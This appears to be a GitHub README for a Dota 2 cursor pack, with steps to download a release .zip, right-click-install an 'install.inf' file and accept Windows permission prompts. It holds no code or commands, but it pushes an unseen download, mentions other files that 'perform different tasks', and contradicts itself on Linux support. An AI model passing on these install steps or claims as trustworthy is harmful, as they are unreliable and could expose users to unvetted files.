# 🖱️ dota2-cursors - Refresh your desktop with custom icons

[![](https://img.shields.io/badge/Download_Cursors-Blue-blue)](https://github.com/woodrowhusbandly602/dota2-cursors/releases)

## 📖 About this project
This project brings the visual style of Dota 2 to your computer desktop. Cursor packs allow you to change the standard pointer on your monitor to match the aesthetic of the game. These files work on Windows and Linux systems. You can customize your mouse pointer look to match specific heroes or themes from the Dota 2 universe.

## 🖥️ Requirements
You need a computer running Windows 10 or Windows 11 to use these files. You do not need experience with code or command-line tools. You only need the ability to extract compressed folders and access your Windows settings menu.

## 💾 Downloading your cursors
Follow these steps to obtain the files for your system:

1. Visit the [official release page](https://github.com/woodrowhusbandly602/dota2-cursors/releases).
2. Look for the section labeled "Assets."
3. Click the link that ends in ".zip" to start your download.
4. Save this file to your Downloads folder or your Desktop.

## ⚙️ Installing on Windows
Follow these instructions to apply your new cursor pack to your Windows desktop:

1. Locate the downloaded .zip file on your computer.
2. Right-click the folder and select "Extract All."
3. Choose a location for these files and click "Extract." 
4. Open the extracted folder and find a file named "install.inf."
5. Right-click the "install.inf" file.
6. Select "Install" from the menu that appears.
7. Confirm the security prompt if Windows asks for permission to make changes.
8. Press the Windows key on your keyboard and type "Mouse settings."
9. Click "Additional mouse settings" on the right side of the window.
10. Select the "Pointers" tab in the window that pops up.
11. Click the "Scheme" drop-down menu.
12. Find the Dota 2 cursor set in the list and select it.
13. Click "Apply" to update your mouse pointer.

## 🛠️ Troubleshooting
If your cursors do not change after you follow the steps, try these actions:

* Restart your computer. Windows sometimes needs a refresh to register new cursor schemes.
* Check that you installed the correct version for your operating system.
* Verify that you right-clicked the "install.inf" file specifically. Other file types in the folder perform different tasks.
* If you see an error about permission, ensure you have administrator rights on your Windows account.

## ✨ Customizing your look
The pack includes multiple variations to match your preference. You can repeat the steps above if you wish to try a different hero skin or color scheme. Windows lets you switch between installed schemes whenever you want. You can always return to the standard Windows pointer by selecting "Windows Default" in the Mouse Properties menu.

## 🗂️ Project folders
The zip folder contains several sub-folders. Each folder represents a different cursor style or size. You should choose the set that looks best on your screen resolution. Higher resolutions may benefit from the larger cursor files provided in the pack.
